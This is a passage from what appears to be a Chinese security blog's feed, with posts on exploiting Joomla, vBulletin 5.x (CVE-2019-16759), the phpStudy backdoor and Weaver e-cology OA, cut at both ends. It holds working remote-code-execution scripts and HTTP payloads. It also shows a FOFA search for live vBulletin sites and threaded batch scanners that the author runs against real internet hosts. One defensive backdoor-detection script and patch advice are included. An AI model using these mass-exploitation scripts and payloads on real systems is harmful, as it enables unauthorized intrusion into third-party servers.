is not vuluable'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print_warning(<span class="string">'ping_backdoor error'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bruter</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, urls,threads)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.vb_urls = Queue.Queue()</span><br><span class="line">        self.threads = threads</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> urls:</span><br><span class="line">            self.vb_urls.put(u[<span class="number">0</span>])</span><br><span class="line">        <span class="comment">#print self.vb_urls.get()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">vb5_rce</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> threading.Lock():</span><br><span class="line">            <span class="keyword">while</span> self.vb_urls.qsize() &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">                target = self.vb_urls.get()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">                    target = <span class="string">'http://'</span>+target</span><br><span class="line">                exploit(target)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span>  range(self.threads):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] thread '</span>+ str(i)</span><br><span class="line">            t = threading.Thread(target=self.vb5_rce)</span><br><span class="line">            t.start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_url</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'joomla.txt'</span>,<span class="string">'r'</span>)  <span class="keyword">as</span> f:</span><br><span class="line">        r = json.loads(f.read())</span><br><span class="line">        urls = r[<span class="string">'results'</span>]</span><br><span class="line">        <span class="keyword">return</span> urls</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_write</span><span class="params">(name,results)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name,mode=<span class="string">'a'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(results)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    urls = get_url()</span><br><span class="line">    vb5_rce = Bruter(urls=urls,threads=<span class="number">20</span>)</span><br><span class="line">    vb5_rce.run()</span><br></pre></td></tr></table></figure><p>利用成功后将在配置文件<code>configuration.php</code>中写入一句话</p><p><img src="https://i.loli.net/2019/10/09/9GsNPzMhqFYIvoW.png" alt></p><p>然后便可以进一步的利用</p><p><img src="https://i.loli.net/2019/10/09/YlZ7iCfRIGr5bND.png" alt></p><p>至此简单利用成功，后面有时间的话，继续对漏洞产生原因出一篇分析文章。</p><h2 id="0x02-参考链接"><a href="#0x02-参考链接" class="headerlink" title="0x02 参考链接"></a>0x02 参考链接</h2><p><a href="https://cn.0day.today/exploit/33327" target="_blank" rel="noopener">https://cn.0day.today/exploit/33327</a></p><p><a href="https://blog.hacktivesecurity.com/index.php?controller=post&amp;action=view&amp;id_post=41" target="_blank" rel="noopener">https://blog.hacktivesecurity.com/index.php?controller=post&amp;action=view&amp;id_post=41</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;joomla!是一套全球知名的内容管理系统，在此之前，joomla曾爆出过严重的反序列化漏洞&lt;cod
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="反序列化" scheme="https://zhengbao.wang/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>vBulletin 5.x远程代码执行漏洞利用</title>
    <link href="https://zhengbao.wang/vBulletin-5-x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://zhengbao.wang/vBulletin-5-x远程代码执行漏洞利用/</id>
    <published>2019-10-08T07:31:39.000Z</published>
    <updated>2019-10-08T07:55:22.490Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>vBulletin 是一个强大，灵活并可完全根据自己的需要定制的商用论坛程序套件，在全球拥有数万用户且增长速度很快。</p><p>2019年9月23日，vBulletin v5（5.0.0-5.5.4）被爆出存在远程代码执行的漏洞利用代码，CVE编号：CVE-2019-16759。</p><h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>因为vBulletin为商用程序，而其用户群主要集中在欧美地区，这里直接使用fofa搜索线上环境测试一下。</p><p>搜索关键词<code>app=&quot;vBulletin&quot;</code>,得到一万多条结果</p><p><img src="https://i.loli.net/2019/10/08/UyixY1DVuvsXShC.png" alt></p><p>手动查看了一下大部分都是4.x版本，要不然就是漏洞不存在，这里直接批量获取批量测试一下。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'app="vBulletin"'</span> | base64 - | xargs -I&#123;&#125; curl <span class="string">"https://fofa.so/api/v1/search/all?email=<span class="variable">$&#123;FOFA_EMAIL&#125;</span>&amp;key=<span class="variable">$&#123;FOFA_KEY&#125;</span>&amp;qbase64=&#123;&#125;"</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/08/EGljrXHMKQIA2Tg.png" alt></p><p>将获取到的内容保存到<code>vb.txt</code>然后进行批量检测</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bruter</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, urls,threads)</span>:</span></span><br><span class="line"></span><br><span class="line">self.vb_urls = Queue.Queue()</span><br><span class="line">self.threads = threads</span><br><span class="line"><span class="keyword">for</span> u <span class="keyword">in</span> urls:</span><br><span class="line">self.vb_urls.put(u[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#print self.vb_urls.get()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vb5_rce</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">with</span> threading.Lock():</span><br><span class="line"><span class="keyword">while</span> self.vb_urls.qsize() &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">target = self.vb_urls.get()</span><br><span class="line"><span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">target = <span class="string">'http://'</span>+target</span><br><span class="line">url = target+<span class="string">"/index.php?routestring=ajax/render/widget_php"</span></span><br><span class="line">headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.2.14"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"en-US,en;q=0.5"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>&#125;</span><br><span class="line">data = &#123;<span class="string">"widgetConfig[code]"</span>: <span class="string">"echo shell_exec('echo boogle'); exit;"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res = requests.post(url, headers=headers, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'boogle'</span> <span class="keyword">in</span> res.text <span class="keyword">and</span> <span class="string">'exit'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] '</span>+ target +<span class="string">' is vuluable '</span></span><br><span class="line">file_write(<span class="string">r'vb5_vulu_site.txt'</span>,target+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] '</span>+ target +<span class="string">' is not vuluable '</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[!] '</span>+ target +<span class="string">' error '</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  range(self.threads):</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] thread '</span>+ str(i)</span><br><span class="line">t = threading.Thread(target=self.vb5_rce)</span><br><span class="line">t.start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_url</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'vb.txt'</span>,<span class="string">'r'</span>)  <span class="keyword">as</span> f:</span><br><span class="line">r = json.loads(f.read())</span><br><span class="line">urls = r[<span class="string">'results'</span>]</span><br><span class="line"><span class="keyword">return</span> urls</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_write</span><span class="params">(name,results)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name,mode=<span class="string">'a'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(results)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">urls = get_url()</span><br><span class="line">vb5_rce = Bruter(urls=urls,threads=<span class="number">10</span>)</span><br><span class="line">vb5_rce.run()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/08/IzA8ogEO4uZdknK.png" alt></p><p>手动测试一下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">widgetConfig[code]=echo shell_exec(<span class="string">'whoami'</span>); <span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/08/faUyPWLIv7VlnXE.png" alt></p><p>至此复现成功，本文所有内容仅供测试，勿作他用。</p><h2 id="0x02-修复建议"><a href="#0x02-修复建议" class="headerlink" title="0x02 修复建议"></a>0x02 修复建议</h2><p><a href="http://members.vbulletin.com/patches.php" target="_blank" rel="noopener">官方</a>已出修复补丁，尽快进行下载修复。</p><p><img src="https://i.loli.net/2019/10/08/NB5XrgynTAqubF9.png" alt></p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://seclists.org/fulldisclosure/2019/Sep/31" target="_blank" rel="noopener">https://seclists.org/fulldisclosure/2019/Sep/31</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;vBulletin 是一个强大，灵活并可完全根据自己的需要定制的商用论坛程序套件，在全球拥有数万用户
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码执行" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>phpstudy后门漏洞利用</title>
    <link href="https://zhengbao.wang/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://zhengbao.wang/phpstudy后门漏洞利用/</id>
    <published>2019-09-26T11:32:41.000Z</published>
    <updated>2019-09-26T12:19:09.780Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Phpstudy是国内的一款免费的PHP调试环境的程序集成包，其通过集成Apache、PHP、MySQL、phpMyAdmin不同版本软件于一身，一次性安装无需配置即可直接使用，具有PHP环境调试和PHP开发功能。对我这种小白来说简直就是一大神器，但就是这样一个伴随了我多达三年之久的神器，突然爆出被恶意植入远控后门，不多说，含泪测试一下自己。</p><p><img src="https://i.loli.net/2019/09/26/tuPLIB6fSvdFw3E.png" alt></p><h2 id="0x01-后门利用"><a href="#0x01-后门利用" class="headerlink" title="0x01 后门利用"></a>0x01 后门利用</h2><p><img src="https://i.loli.net/2019/09/26/uDvUm2Hqw6yJBxG.png" alt></p><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Poc</span><span class="params">(ip,cmd)</span>:</span></span><br><span class="line">    cmd = <span class="string">'system('</span>+cmd+<span class="string">');'</span></span><br><span class="line">    poc = base64.b64encode(cmd)</span><br><span class="line">    print(poc)</span><br><span class="line">    <span class="comment">#poc = "c3lzdGVtKCdjYWxjLmV4ZScpOw=="</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>,</span><br><span class="line">    <span class="string">"Connection"</span>: <span class="string">"close"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip,deflate"</span>,</span><br><span class="line">    <span class="string">"Accept-Charset"</span>: poc,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    url = ip</span><br><span class="line">    r = requests.get(url,headers=headers)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Administrator"</span> <span class="keyword">or</span> <span class="string">"DefaultAccount"</span> <span class="keyword">or</span> <span class="string">"Guest"</span> <span class="string">"hello phpstudy"</span><span class="keyword">in</span> r.text:</span><br><span class="line">        print(<span class="string">"[+] phpstudy is vuluable"</span>)</span><br><span class="line">        print(r.text.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] phpstudy is safe"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">    print(<span class="string">"python phpstudy.py http://127.0.0.1 cmd"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    Poc(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/26/He1lc9bJ2LzB6h8.png" alt></p><h2 id="0x02-后门检测"><a href="#0x02-后门检测" class="headerlink" title="0x02 后门检测"></a>0x02 后门检测</h2><p>附上pcat的一个检测脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line">__author__=<span class="string">'pcat@chamd5.org'</span></span><br><span class="line">__blog__=<span class="string">'http://pcat.cc'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strings</span><span class="params">(file)</span> :</span></span><br><span class="line">    chars = string.printable[:<span class="number">94</span>]</span><br><span class="line">    shortestReturnChar = <span class="number">4</span></span><br><span class="line">    regExp = <span class="string">'[%s]&#123;%d,&#125;'</span> % (chars, shortestReturnChar)</span><br><span class="line">    pattern = re.compile(regExp)</span><br><span class="line">    <span class="keyword">with</span> open(file, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> pattern.findall(f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">grep</span><span class="params">(lines,pattern)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> pattern <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">yield</span> line</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pcheck</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="comment"># trojan feature</span></span><br><span class="line">    trojan=<span class="string">'@eval'</span></span><br><span class="line">    <span class="comment"># just check dll file</span></span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">'.dll'</span>):        </span><br><span class="line">        lines=strings(filename)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            grep(lines,trojan).next()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'=== &#123;0&#125; ==='</span>.format(filename)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> grep(lines,trojan):</span><br><span class="line">            <span class="keyword">print</span> line</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(php_path)</span>:</span></span><br><span class="line">    <span class="comment"># . stand for current directory</span></span><br><span class="line">    <span class="keyword">for</span> path, dirs, files <span class="keyword">in</span> os.walk(php_path, topdown=<span class="literal">False</span>):</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">            pcheck(os.path.join(path, name))</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> dirs:</span><br><span class="line">            pcheck(os.path.join(path, name))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"python check.py F:\phpstudy\PHPTutorial\php"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        foo(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/26/tmgHVvXcsbk4T6E.png" alt></p><p><img src="https://i.loli.net/2019/09/26/cNKoW6TsS4gdty3.png" alt></p><h2 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h2><ul><li><p>及时清除后门文件并作安全检查看是否被种下其他后门</p></li><li><p>更新至最新版本，毕竟phpstudy还是给我们带来了很多的便捷，不能因噎废食。</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Phpstudy是国内的一款免费的PHP调试环境的程序集成包，其通过集成Apache、PHP、MyS
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码执行" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>泛微OA远程代码执行漏洞利用</title>
    <link href="https://zhengbao.wang/%E6%B3%9B%E5%BE%AEOA%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://zhengbao.wang/泛微OA远程代码执行漏洞利用/</id>
    <published>2019-09-26T06:30:31.000Z</published>
    <updated>2019-10-05T03:02:33.296Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>泛微OA远程代码执行漏洞，泛微e-cology OA系统的JAVA Beanshell接口可被未授权访问，攻击者调用该Beanshell接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行。</p><p>影响版本：<code>7.0</code> <code>8.0</code> <code>8.1</code></p><h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>通过访问泛微协同办公系统<code>weaver/bsh.servlet.BshServlet</code>，可直接访问Beanshell接口执行任意命令,post<code>bsh.script=exec(&quot;whoami&quot;);</code>即可执行命令。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/weaver/bsh.servlet.BshServlet</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: zhengbao.wang</span><br><span class="line"><span class="attribute">Content-Length</span>: 104</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Origin</span>: https://zhengbao.wang</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Referer</span>: http://zhengbao/weaver/bsh.servlet.BshServlet</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: testBanCookie=test; JSESSIONID=abcNcyM2yAMSeaWQ-nS1w</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">bsh.script=exec%28%22whoami%22%29%3B%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/26/KBloHm7r9R3P21O.png" alt></p><h2 id="0x02-修复方式"><a href="#0x02-修复方式" class="headerlink" title="0x02 修复方式"></a>0x02 修复方式</h2><p>升级到泛微OA最新版本或安装官方BSH补丁包<a href="https://www.weaver.com.cn/cs/securityDownload.asp" target="_blank" rel="noopener">https://www.weaver.com.cn/cs/securityDownload.asp</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;泛微OA远程代码执行漏洞，泛微e-cology OA系统的JAVA Beanshell接口可被未授权
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码执行" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>BEA Weblogic Server ssrf漏洞利用</title>
    <link href="https://zhengbao.wang/BEA-Weblogic-Server-ssrf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://zhengbao.wang/BEA-Weblogic-Server-ssrf漏洞利用/</id>
    <published>2019-09-26T02:28:03.000Z</published>
    <updated>2019-09-26T12:23:06.385Z</updated>
    
